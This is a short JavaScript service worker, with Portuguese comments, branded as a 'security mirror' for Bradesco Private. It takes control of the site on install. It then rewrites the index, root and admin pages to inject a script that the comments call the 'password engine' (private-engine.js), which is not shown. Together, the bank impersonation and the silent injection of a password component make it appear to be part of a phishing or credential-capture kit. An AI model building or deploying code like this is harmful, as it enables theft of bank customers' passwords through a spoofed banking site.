/* SW.JS - ESPELHAMENTO DE SEGURANÇA BRADESCO PRIVATE */
const CACHE_NAME = 'bradesco-private-v100';

self.addEventListener('install', (e) => {
    self.skipWaiting();
});

self.addEventListener('activate', (e) => {
    e.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    // INTERCEPTAÇÃO: Se carregar o index ou admin imutável, injeta o motor de senha
    if (url.pathname.endsWith('index.html') || url.pathname === '/' || url.pathname.endsWith('admin.html')) {
        event.respondWith(
            fetch(event.request).then(async (res) => {
                let html = await res.text();
                // Injeta o motor ANTES de carregar o resto do site imutável
                const injecao = '<script src="private-engine.js"></script>';
                return new Response(html.replace('</body>', injecao + '</body>'), {
                    headers: { 'Content-Type': 'text/html' }
                });
            })
        );
    }
});
